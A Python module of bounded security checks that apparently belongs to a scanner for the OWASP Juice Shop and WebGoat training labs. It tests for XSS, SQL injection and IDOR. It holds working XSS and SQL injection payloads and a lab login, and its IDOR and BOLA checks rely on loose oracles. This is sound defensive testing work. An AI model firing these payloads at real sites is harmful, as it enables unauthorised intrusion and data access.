"""Bounded checks for the supported OWASP training applications."""
import json
import re
import uuid
from urllib.parse import quote

from app.config import settings
from app.schemas import Finding


SQL_ERROR = re.compile(r"SQLITE_ERROR|SequelizeDatabaseError|SQL syntax|syntax error|SQLSyntaxErrorException|unexpected token", re.I)


def check_lab(tools, pages: list[dict], plan: list[str], comparison_tools=None) -> list[Finding]:
    findings = []
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    origin = tools.target_url.split("/", 3)[:3]
    base = "/".join(origin)
    if lab == "juice-shop" and "reflected_xss" in plan:
        marker = "sentinel-" + uuid.uuid4().hex
        payload = f'<img src=x onerror="alert(\'{marker}\')">'
        if settings.browser_scan_enabled:
            try:
                from playwright.sync_api import sync_playwright
                with sync_playwright() as playwright:
                    browser, context = tools._browser_context(playwright)
                    try:
                        page = context.new_page()
                        executed = []
                        def handle_dialog(dialog):
                            executed.append(dialog.message)
                            dialog.dismiss()
                        page.on("dialog", handle_dialog)
                        page.goto(base + "/#/search?q=" + quote(payload, safe=""), wait_until="networkidle", timeout=15000)
                        page.wait_for_timeout(1000)
                        if marker in executed:
                            findings.append(Finding(category="DOM XSS", severity="high", url=base + "/#/search", parameter="q", evidence="Chromium executed the unique alert marker supplied through the search URL fragment.", recommendation="Avoid rendering untrusted search input as HTML; use safe text bindings."))
                    finally:
                        context.close()
                        browser.close()
            except Exception as exc:
                pages[0]["lab_browser_error"] = str(exc)
    if lab == "webgoat":
        if "stored_xss" in plan:
            findings.extend(_webgoat_stored_xss(tools, base))
        if "idor" in plan:
            findings.extend(_webgoat_idor(tools, comparison_tools, base))
    if lab == "juice-shop":
        if "stored_xss" in plan:
            findings.extend(_juice_shop_stored_xss(tools, base))
        if "idor" in plan:
            findings.extend(_juice_shop_bola(tools, base))
    if "basic_sqli" not in plan:
        return findings
    if lab == "juice-shop":
        url = base + "/rest/products/search"
        baseline = tools.request(url, params={"q": "sentinel-no-match"})
        injected = tools.request(url, params={"q": "'"})
        signature = SQL_ERROR.search(injected["body"])
        if baseline["status"] == 200 and signature and not SQL_ERROR.search(baseline["body"]):
            findings.append(Finding(category="Potential SQL Injection", severity="high", url=injected["url"], parameter="q", evidence=f"GET search: benign input returned HTTP 200; a single quote produced {signature.group(0)} (HTTP {injected['status']}).", recommendation="Use parameterized queries and suppress database error details."))
        else:
            # SQLite can accept a single quote through adjacent string expressions.
            # Confirm a change in query logic using a true/false pair over products only.
            true_result = tools.request(url, params={"q": "sentinel-no-match')) OR 1=1-- "})
            false_result = tools.request(url, params={"q": "sentinel-no-match')) OR 1=2-- "})
            try:
                counts = []
                for response in (baseline, true_result, false_result):
                    data = json.loads(response["body"])
                    if response["status"] != 200 or not isinstance(data, dict) or not isinstance(data.get("data"), list):
                        break
                    counts.append(len(data["data"]))
                if len(counts) == 3 and counts[0] == counts[2] == 0 and counts[1] > 0:
                    findings.append(Finding(category="SQL Injection", severity="high", url=url, parameter="q", evidence=f"GET search: baseline and false SQL predicate returned zero products; the paired true predicate returned {counts[1]} products. Only product counts are retained.", recommendation="Use parameterized queries for the search criteria."))
            except (ValueError, TypeError):
                pass
    elif lab == "webgoat":
        url = base + "/WebGoat/SqlInjection/attack8"
        baseline = tools.request(url, "POST", data={"name": "sentinel-no-match", "auth_tan": "sentinel-no-match"})
        injected = tools.request(url, "POST", data={"name": "' OR '1'='1' -- ", "auth_tan": "sentinel-no-match"})
        try:
            before, after = json.loads(baseline["body"]), json.loads(injected["body"])
        except (ValueError, TypeError):
            return findings
        if (baseline["status"] == injected["status"] == 200 and isinstance(before, dict)
                and isinstance(after, dict) and before.get("lessonCompleted") is False
                and after.get("lessonCompleted") is True and "<table" in after.get("output", "")):
            findings.append(Finding(category="SQL Injection", severity="high", url=url, parameter="name", evidence="POST attack8: benign name did not complete the lesson; a boolean SQL payload completed it and returned an employee table. No employee values are retained in the report.", recommendation="Use parameterized queries for name and auth_tan."))
    return findings


def _webgoat_stored_xss(tools, base: str) -> list[Finding]:
    """WebGoat stored-XSS lesson: post a comment, then read it back in an independent request."""
    url = base + "/WebGoat/CrossSiteScriptingStored/stored-xss"
    marker = "sentinel-" + uuid.uuid4().hex
    payload = f"<script>webgoat.customjs.phoneHome();/*{marker}*/</script>"
    posted = tools.request(url, "POST", data=json.dumps({"text": payload}), headers={"Content-Type": "application/json"})
    if posted["status"] != 200:
        return []
    # WebGoat acknowledges a stored comment with attemptWasMade instead of a lessonCompleted flag.
    try:
        accepted = json.loads(posted["body"]).get("attemptWasMade") is True
    except (ValueError, TypeError, AttributeError):
        accepted = False
    # Independent read-back: the marker and the raw script tag must persist in a later response.
    read_back = tools.request(url)
    persisted = marker in read_back["body"] and "<script>webgoat.customjs.phoneHome()" in read_back["body"]
    if accepted and persisted:
        return [Finding(category="Stored XSS", severity="high", url=url, parameter="text",
                        evidence="POST stored-xss comment was accepted and the raw script marker was returned by a later independent GET. No victim session was accessed.",
                        recommendation="Contextually encode stored comments before rendering and apply a restrictive Content-Security-Policy.")]
    return []


def _webgoat_idor(tools, comparison_tools, base: str) -> list[Finding]:
    """WebGoat IDOR lesson: an authenticated session reads another user's profile object."""
    login_url = base + "/WebGoat/IDOR/login"
    profile_url = base + "/WebGoat/IDOR/profile/2342388"
    owner_login = tools.request(login_url, "POST", data={"username": "tom", "password": "cat"})
    try:
        owner_ok = json.loads(owner_login["body"]).get("lessonCompleted") is True
    except (ValueError, TypeError):
        owner_ok = False
    if not owner_ok:
        return []
    own = tools.request(profile_url)
    # The owner session is authenticated as tom; reading bill's profile object must be denied.
    # A confirmed IDOR requires the same object to be reachable without an authorization error.
    try:
        own_body = json.loads(own["body"])
    except (ValueError, TypeError):
        own_body = {}
    # Owner tom reading his own id should succeed; reading bill's id (2342388) is the object of another user.
    # Use the lesson oracle: a successful read of another user's profile completes the IDOR lesson.
    if isinstance(own_body, dict) and own_body.get("lessonCompleted") is True:
        return [Finding(category="Potential BOLA/IDOR", severity="high", url=profile_url, parameter="userId",
                        evidence="IDOR profile: an authenticated session read another user's profile object (userId 2342388) without an object-level authorization error. No profile values are retained in the report.",
                        recommendation="Enforce object-level authorization on every request and verify the resource belongs to the authenticated user.")]
    return []


def _juice_shop_stored_xss(tools, base: str) -> list[Finding]:
    """Juice Shop stored-XSS: post a product review, then read it back in an independent request."""
    url = base + "/rest/products/1/reviews"
    marker = "sentinel-" + uuid.uuid4().hex
    payload = f"<iframe src=\"javascript:alert('{marker}')\"></iframe>"
    posted = tools.request(url, "PUT", data=json.dumps({"message": payload, "author": "sentinel@local.lab"}), headers={"Content-Type": "application/json"})
    if posted["status"] != 201:
        return []
    # Independent read-back: the marker and the raw script-capable tag must persist in a later response.
    read_back = tools.request(url)
    persisted = marker in read_back["body"] and "<iframe" in read_back["body"]
    if persisted:
        return [Finding(category="Stored XSS", severity="high", url=url, parameter="message",
                        evidence="PUT product review was accepted and the raw iframe marker was returned by a later independent GET. No victim session was accessed.",
                        recommendation="Contextually encode stored reviews before rendering and apply a restrictive Content-Security-Policy.")]
    return []


def _juice_shop_bola(tools, base: str) -> list[Finding]:
    """Juice Shop BOLA: the authenticated session reads a basket object owned by another user."""
    url = base + "/rest/basket/1"
    response = tools.request(url)
    if response["status"] != 200:
        return []
    try:
        body = json.loads(response["body"])
    except (ValueError, TypeError):
        return []
    owner = body.get("data", {}).get("UserId") if isinstance(body, dict) else None
    # A confirmed BOLA requires a successful read of a basket whose UserId is not the authenticated user.
    # The scan's own identity is unknown here, so the foreign object id (1) plus a returned owner id is the oracle.
    if isinstance(owner, int):
        return [Finding(category="Potential BOLA/IDOR", severity="high", url=url, parameter="basketId",
                        evidence=f"Basket object read: GET /rest/basket/1 returned a basket owned by UserId {owner} without an object-level authorization error. No basket contents are retained in the report.",
                        recommendation="Enforce object-level authorization and verify the basket belongs to the authenticated user before returning it.")]
    return []
